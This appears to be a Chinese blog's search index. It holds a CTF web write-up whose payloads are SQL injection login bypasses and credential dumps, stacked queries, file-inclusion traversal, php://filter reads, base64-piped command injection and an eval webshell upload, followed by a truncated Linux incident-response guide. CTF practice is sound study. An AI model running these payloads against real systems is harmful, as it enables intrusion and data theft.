<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CtfWeb-Part 1</title>
      <link href="/2022/05/13/2022-05-13-CtfWeb-Part-1/"/>
      <url>/2022/05/13/2022-05-13-CtfWeb-Part-1/</url>
      
        <content type="html"><![CDATA[<p>★：入门：HTTP、IP、SQL基本知识点</p><p>★★：基础：涉及拼接、基础知识</p><p>★★★：拓展：涉及绕过、组合利用</p><p>★★★★：全站代码审计、综合运用</p><h2 id="★★-极客大挑战-2019-EasySQL"><a href="#★★-极客大挑战-2019-EasySQL" class="headerlink" title="★★[极客大挑战 2019]EasySQL"></a>★★[极客大挑战 2019]EasySQL</h2><p>Payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名:&#x27; or &#x27;&#x27;=&#x27;</span><br><span class="line">密码:&#x27; or &#x27;&#x27;=&#x27;</span><br></pre></td></tr></table></figure><h2 id="★★★-HCTF-2018-WarmUp"><a href="#★★★-HCTF-2018-WarmUp" class="headerlink" title="★★★[HCTF 2018]WarmUp"></a>★★★[HCTF 2018]WarmUp</h2><blockquote><p>php函数 isset、is_string、in_arry、mb_substr、mb_strpos 综合应用</p></blockquote><p>1、F12查看源码 看到注释</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- source.php --&gt;</span><br></pre></td></tr></table></figure><p>2、审计代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        # 传入变量 $<span class="title">page</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="comment"># 定义 $whitelist 列表</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="comment"># 判断 $page 是否存在 或 $page 是否为字符串</span></span><br><span class="line">            <span class="comment"># 第一次判断 1.$page存在 2.$page是字符串</span></span><br><span class="line">            <span class="comment"># Payload: ?file=string</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># 判断 $page 内容是否存在于 $whitelist 列表 如果是 则返回True</span></span><br><span class="line">            <span class="comment"># 第二次判断 $file 的值必须是 source.php 或 hint.php</span></span><br><span class="line"><span class="comment"># Paylaod: ?file=source.php</span></span><br><span class="line">            </span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line"><span class="comment"># 定义 $_page 内容为 $page [0] 到 [$page变量中?第一次出现之前]</span></span><br><span class="line">            <span class="comment"># 也就是将 $file 字符串?以及之后的内容全部阶段</span></span><br><span class="line">            <span class="comment"># 例如 $page=source.php? 则 $_page = source.php</span></span><br><span class="line">            <span class="comment"># $page = &quot;?file=source.php&quot; 则 $_page = &quot;file=source.php&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment"># 第三次判断 $_page 是否在于 $whitelist</span></span><br><span class="line">            <span class="comment"># Payload: ?file=source.php?任意字符串</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="comment"># 对 $_page 进行一次decode解码</span></span><br><span class="line">            <span class="comment"># 在第三次判断时浏览器已经将我们传入的 $page 转换为了URL编码 此时进行一次 urldecode 则又恢复为字符串</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="comment"># 对 $_page 再一次进行截断</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="comment"># 如果 $_page 的字符串在 $whitelist 内，则返回True</span></span><br><span class="line">            <span class="comment"># 此时 $page = ?file=source.php?source.php? 已经满足所有判断要求 在最后一个?后可以再跟上参数 交给source.php执行而不必收到checkFile方法的限制 此时可以构造任意payload</span></span><br><span class="line">            <span class="comment"># 例如 ?file=source.php?source.php?file=../../../../../flag</span></span><br><span class="line">            <span class="comment"># 在访问 hint.php 页面时看到了提示 flag not here, and flag in ffffllllaaaagggg</span></span><br><span class="line">            <span class="comment"># 第四次判断 类似于第三次判断，在第三次判断后的 $_page 仍在列表 $whitelist 内</span></span><br><span class="line">            <span class="comment"># Payload: ?file=source.php?source.php?file=../../../../../ffffllllaaaagggg</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line"><span class="comment"># 判断 是否传入变量 $file 参数 且 $file为字符串 且 符合方法emmm的checkFile方法</span></span><br><span class="line">    <span class="comment"># 检查 类emmm 的 checkFile方法</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 第一次判断 1.$page存在 2.$page是字符串</span></span><br><span class="line"><span class="comment"># 第二次判断 $file 的值必须是 source.php 或 hint.php</span></span><br><span class="line"><span class="comment"># 第三次判断 $_page 是否在于 $whitelist</span></span><br><span class="line"><span class="comment"># 第四次判断 类似于第三次判断，截断两次后的 $_page 仍在列表 $whitelist 内</span></span><br></pre></td></tr></table></figure><p>3、审计代码得知需要四次判断，在满足所有条件后，页面仍包含 source.php 页面，source.php 仍存在文件包含代码，此时给file传入参数，即可查看任意文件</p><p>Payload: ?file&#x3D;source.php?source.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</p><blockquote><p>耗时26m</p></blockquote><h2 id="★-极客大挑战-2019-Havefun"><a href="#★-极客大挑战-2019-Havefun" class="headerlink" title="★[极客大挑战 2019]Havefun"></a>★[极客大挑战 2019]Havefun</h2><p>1、查看源码底部发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cat</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$cat</span>==<span class="string">&#x27;dog&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>2、传入 $cat 值为 dog</p><p>Payload: ?cat&#x3D;dog</p><h2 id="★★-ACTF2020-新生赛-Include"><a href="#★★-ACTF2020-新生赛-Include" class="headerlink" title="★★[ACTF2020 新生赛]Include"></a>★★[ACTF2020 新生赛]Include</h2><blockquote><p>php:&#x2F;&#x2F;filter 伪协议</p></blockquote><p>1、点击页面tips 看到 URL 类似包含</p><p>2、php:&#x2F;&#x2F;filter 伪协议查看 flag.php 页面源码</p><p>3、解码后获得 flag</p><p>Payload: ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><h2 id="★★★-强网杯-2019-随便注"><a href="#★★★-强网杯-2019-随便注" class="headerlink" title="★★★[强网杯 2019]随便注"></a>★★★[强网杯 2019]随便注</h2><blockquote><p>MySQL 1.更改表名、更改字段名、堆叠注入 2.MySQL十六进制转换预处理 3.MySQL句柄指针</p></blockquote><p>已知存在数字型注入，过滤了关键字<code>/select|update|delete|drop|insert|where|\./i</code>，Payload: <code>1&#39; or &#39;&#39;=&#39;</code> 爆出所有数据</p><p>堆叠注入 <code>&#39;; show databases; --</code>查询所有数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;show tables; --</span><br><span class="line"># 查询当前使用的数据库的所有表</span><br><span class="line">&#x27;;show columns from `1919810931114514`; --</span><br><span class="line"># 查询 1919810931114514 表下所有字段 整数型表要用``选择</span><br><span class="line">&#x27;;show columns from words; --</span><br><span class="line"># 查询 words 表下所有字段</span><br></pre></td></tr></table></figure><p>1919810931114514 表下含有字段 flag</p><p>words 表下有字段 id, data</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205130542478.png" alt="image-20220513054209360"></p><p>猜测查询语句为<code>select data from words where id=$id</code></p><p>我们这里前段传入的即为 $id 函数</p><p>解法1 - 更改表名：</p><p>先将 1919810931114514 表下的 flag 字段修改为 id,再将  words 表修改为其他名称；在同一行修改 1919810931114514 表名称为 words</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; ALTER TABLE `1919810931114514` CHANGE flag id varchar(100); ALTER TABLE words RENAME backup_words; ALTER TABLE `1919810931114514` RENAME words; --</span><br></pre></td></tr></table></figure><p>最后键入查询所有数据Payload: <code>&#39; or &#39;&#39;=&#39;</code></p><p>解法2 - 十六进制预处理：</p><p>1.将查询语句转换为16进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from `1919810931114514`</span><br><span class="line">转换后</span><br><span class="line">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span><br></pre></td></tr></table></figure><p>构建Payload 配置变量 set@x ；调用变量@x作为预处理语句 prepare execsql from @x；执行语句 execute exesql；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; sEt@x=0x73656c656374202a2066726f6d20603139313938313039333131313435313460; prepare execsql from @x; execute execsql; --</span><br></pre></td></tr></table></figure><p>解法3 - HANDLER 句柄 指针查询</p><p>将查询结果保存到 <code>a</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; HANDLER `1919810931114514` OPEN as `a`; HANDLER `a` READ NEXT; --</span><br></pre></td></tr></table></figure><h2 id="★★★★-Pwnhub-Mynotes-Pwnhub公开赛"><a href="#★★★★-Pwnhub-Mynotes-Pwnhub公开赛" class="headerlink" title="★★★★[Pwnhub]Mynotes - Pwnhub公开赛"></a>★★★★[Pwnhub]Mynotes - Pwnhub公开赛</h2><blockquote></blockquote><h2 id="★★-ACTF2020-新生赛-Exec"><a href="#★★-ACTF2020-新生赛-Exec" class="headerlink" title="★★[ACTF2020 新生赛]Exec"></a>★★[ACTF2020 新生赛]Exec</h2><blockquote><p>Windows命令执行</p></blockquote><p>Payload:</p><p>127.0.0.1||cat &#x2F;flag</p><h2 id="★★★-SUCTF-2019-EasySQL"><a href="#★★★-SUCTF-2019-EasySQL" class="headerlink" title="★★★[SUCTF 2019]EasySQL"></a>★★★[SUCTF 2019]EasySQL</h2><blockquote><p>堆叠注入、MySQL配置</p></blockquote><p>大部分 Writeup 说明存在源码泄露，查询语句如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select &quot;</span>.<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>].<span class="string">&quot;||flag from Flag&quot;</span>;</span><br></pre></td></tr></table></figure><p>|| 在 MySQL 中默认是逻辑或，此时无法flag</p><p>设置 sql_mode&#x3D;pipes_as_concat </p><p>将 || 视为字符串连接操作符而非 或 运算符，和字符串的拼接函数CONCAT()相类似。</p><p>Payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;SET sql_mode=PIPES_AS_CONCAT;select 0</span><br><span class="line"># select 1;SET sql_mode=PIPES_AS_CONCAT;select 0||flag from Flag;</span><br></pre></td></tr></table></figure><h2 id="★-极客大挑战-2019-Secret-File"><a href="#★-极客大挑战-2019-Secret-File" class="headerlink" title="★[极客大挑战 2019]Secret File"></a>★[极客大挑战 2019]Secret File</h2><blockquote><p>页面自动跳转、php伪协议php:&#x2F;&#x2F;filter</p></blockquote><h2 id="★★★-GXYCTF2019-Ping-Ping-Ping"><a href="#★★★-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="★★★[GXYCTF2019]Ping Ping Ping"></a>★★★[GXYCTF2019]Ping Ping Ping</h2><blockquote><p>Linux连接符、操作系统占位符、变量覆盖、base64解密执行</p></blockquote><p>普通命令执行，使用 <code>||</code> 连接符构建语句 <code>127.0.0.1||ls</code> 查看文件</p><p>直接查看 flag.php 被过滤，查看 index.php 被过滤</p><p>使用 Linux 占位符替换空格，构建语句 <code>cat$IFS$1index.php</code> 查看 index.php 源码</p><p>分析 index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    # 过滤 &amp; / ? * \x&#123;00&#125;-\x&#123;20&#125; &#x27;</span> <span class="string">&quot; \ () [] &#123;&#125;</span></span><br><span class="line"><span class="string">    die(&quot;</span>fxck your symbol!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;</span>/ /<span class="string">&quot;, <span class="subst">$ip</span>))&#123;</span></span><br><span class="line"><span class="string">  # 过滤空格</span></span><br><span class="line"><span class="string">    die(&quot;</span>fxck your space!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;</span>/bash/<span class="string">&quot;, <span class="subst">$ip</span>))&#123;</span></span><br><span class="line"><span class="string">  # 过滤字符串 bash</span></span><br><span class="line"><span class="string">    die(&quot;</span>fxck your bash!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;</span>/.*f.*l.*a.*g.*/<span class="string">&quot;, <span class="subst">$ip</span>))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;</span>fxck your flag!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    # 贪婪匹配 字符串内是否包含按顺序出现的 flag</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  <span class="subst">$a</span> = shell_exec(&quot;</span>ping -c <span class="number">4</span> <span class="string">&quot;.<span class="subst">$ip</span>);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r(<span class="subst">$a</span>);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>方法1：</p><p>先举个例子 利用 bash设置变量</p><p><code>a=ag;b=fl;echo $b$a.php</code> 此时输出结果为flag.php</p><p>利用变量替换cat时的字符串，构建查询语句</p><p>Payload: <code>127.0.0.1;a=ag;b=fl;cat$IFS$1$b$a.php</code></p><p>方法2：</p><p>使用base64 -d 配合连接符执行命令</p><p>将 cat flag.php 通过base64加密后获得字符串 <code>Y2F0IGZsYWcucGhw</code></p><p>Payload: <code>127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></p><h2 id="★★★-极客大挑战-2019-LoveSQL"><a href="#★★★-极客大挑战-2019-LoveSQL" class="headerlink" title="★★★[极客大挑战 2019]LoveSQL"></a>★★★[极客大挑战 2019]LoveSQL</h2><blockquote><p>MySQL字符型注入、information注入</p></blockquote><p> 判断注入点为字符型注入，构建Payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 绕过登录验证</span><br><span class="line">用户名: 1</span><br><span class="line">密码: &#x27; or 1=1 #</span><br><span class="line"></span><br><span class="line"># 判断查询数</span><br><span class="line">?username=1&#x27; or &#x27;&#x27;=&#x27;&amp;password=&#x27; order by 3 %23</span><br><span class="line"></span><br><span class="line"># 查看当前使用的库</span><br><span class="line">?username=1&#x27; or &#x27;&#x27;=&#x27;&amp;password=&#x27; union select 1,database(),3 %23</span><br><span class="line"></span><br><span class="line"># 查看geek库的表</span><br><span class="line">?username=1&#x27; or &#x27;&#x27;=&#x27;&amp;password=&#x27; union select 1,group_concat(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=&#x27;geek&#x27; %23</span><br><span class="line"></span><br><span class="line"># 查看 l0ve1ysq1 表下的字段</span><br><span class="line">?username=1&#x27; or &#x27;&#x27;=&#x27;&amp;password=&#x27; union select 1,group_concat(COLUMN_NAME),3 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=&#x27;geek&#x27; AND TABLE_NAME=&#x27;l0ve1ysq1&#x27; %23</span><br><span class="line"></span><br><span class="line"># 查看 username,password 字段下所有数据</span><br><span class="line">?username=1&#x27; or &#x27;&#x27;=&#x27;&amp;password=&#x27; union select 1,group_concat(username),group_concat(password) from l0ve1ysq1 %23</span><br></pre></td></tr></table></figure><h2 id="★★-极客大挑战-2019-Http"><a href="#★★-极客大挑战-2019-Http" class="headerlink" title="★★[极客大挑战 2019]Http"></a>★★[极客大挑战 2019]Http</h2><blockquote><p>Burpssuite-&gt;Target-&gt;Site map 查看页面加载的所有站点</p><p>HTTP请求头配置</p></blockquote><p>Burpsuite代理访问站点 查看 Burpsuite 的 Site map</p><p>进入Secret.php页面 HTTP请求数据包添加以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x-forwarded-for: 127.0.0.1</span><br><span class="line">Referer: https://Sycsecret.buuoj.cn</span><br><span class="line">User-Agent: Syclover</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205160345975.png" alt="image-20220516034515576"></p><h2 id="★★-极客大挑战-2019-Knife"><a href="#★★-极客大挑战-2019-Knife" class="headerlink" title="★★[极客大挑战 2019]Knife"></a>★★[极客大挑战 2019]Knife</h2><blockquote><p>PHP后门利用</p></blockquote><p>Hackbar直接POST参数<code>Syc=system(&#39;cat /flag&#39;);</code>通过system函数执行系统命令（源码中查看返回数据）</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205160348335.png" alt="image-20220516034821913"></p><h2 id="★★-极客大挑战-2019-Upload"><a href="#★★-极客大挑战-2019-Upload" class="headerlink" title="★★[极客大挑战 2019]Upload"></a>★★[极客大挑战 2019]Upload</h2><blockquote><p>绕过检测 Content-type、PHP可解析后缀、文件头GIF89a、script标签输出php</p></blockquote><p>直接上传 php文件出错， 修改 <code>Content-type: image/jpeg</code> 返回 NOT PHP</p><p>1、修改文件后缀为 <code>.phtml</code> 提示 your file include ‘&lt;?’</p><p>2、修改内容为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;eval($_REQUEST[&#x27;x&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>提示 is’s not image at all</p><p>3、修改文件头为 GIF89a 上传成功</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205160419720.png" alt="image-20220516041932663"></p><p>直到做完这题我也没搞清楚判断原理，正常jpg、png、jpeg图片均无法上传，唯独使用php后缀的文件上传，在修改Content-type后页面才会有提示。抛开这些不谈，题目的知识点也并不多。</p><h2 id="★★-ACTF2020-新生赛-Upload"><a href="#★★-ACTF2020-新生赛-Upload" class="headerlink" title="★★[ACTF2020 新生赛]Upload"></a>★★[ACTF2020 新生赛]Upload</h2><blockquote><p>修改Content-type、PHP可解析后缀</p></blockquote><p>修改 <code>Content-type: image/jpeg</code> 再修改后缀为<code>.phtml</code> 即可上传</p><h2 id="★★★-极客大挑战-2019-BabySQL"><a href="#★★★-极客大挑战-2019-BabySQL" class="headerlink" title="★★★[极客大挑战 2019]BabySQL"></a>★★★[极客大挑战 2019]BabySQL</h2><blockquote><p>str_replace双写绕过、information注入</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 判断查询数</span><br><span class="line">?username=&#x27; or &#x27;&#x27;=&#x27;&amp;password=&#x27; order by 3 %23</span><br><span class="line">页面提示字符串被过滤成 der 3，考虑 or by 被过滤，构建双写Payload</span><br><span class="line">?username=&#x27; oorr &#x27;&#x27;=&#x27;&amp;password=&#x27; oorrder bbyy 3 %23</span><br><span class="line"></span><br><span class="line"># 双写查询当前使用库</span><br><span class="line">?username=&#x27; or &#x27;&#x27;=&#x27;&amp;password=&#x27; union select 1,database(),3 %23</span><br><span class="line">页面返回 1,database(),3 考虑 union 和 select 都被过滤</span><br><span class="line">?username=&#x27; oorr &#x27;&#x27;=&#x27;&amp;password=&#x27; uniunionon seleselectct 1,database(),3 %23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 查看geek库下的表 </span><br><span class="line">?username=&#x27; or &#x27;&#x27;=&#x27;&amp;password=&#x27; ununionion selselectect 1,group_concat(TABLE_NAME),3 frfromom infoorrmation_schema.tables whwhereere table_schema=&#x27;geek&#x27; %23</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linunx应急响应</title>
      <link href="/2022/05/12/2022-05-12-Linunx%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2022/05/12/2022-05-12-Linunx%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h2 id="一、用户管理"><a href="#一、用户管理" class="headerlink" title="一、用户管理"></a>一、用户管理</h2><p>管理员应定期检查&#x2F;etc&#x2F;passwd文件，以查看主机上启动的用户。对于系统中已不再使用的用户，应及时将他们清除。许多服务会在安装过程中在系统创建专门的执行用户，比如ftp、news、postfix、apache、squid等。这类用户一般只是作为服务的执行者，而无需登录操作系统，因此往往会被管理员所忽略。为了防止这一类用户账号被黑客和恶意破坏者利用作为入侵服务器的跳板，可以采用如下方法禁止这些用户登录操作系统。</p><p>删除账号：</p><p><code>userdel 用户名</code></p><p>删除组用户账号</p><p><code>groupdel username</code></p><p>设置合适的密码策略</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chage [options] user</span></span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line"> -m 密码可更改的最小天数。为0时代表任何时候都可以更改密码</span><br><span class="line"> -M 密码保持有效的最大天数</span><br><span class="line">-W 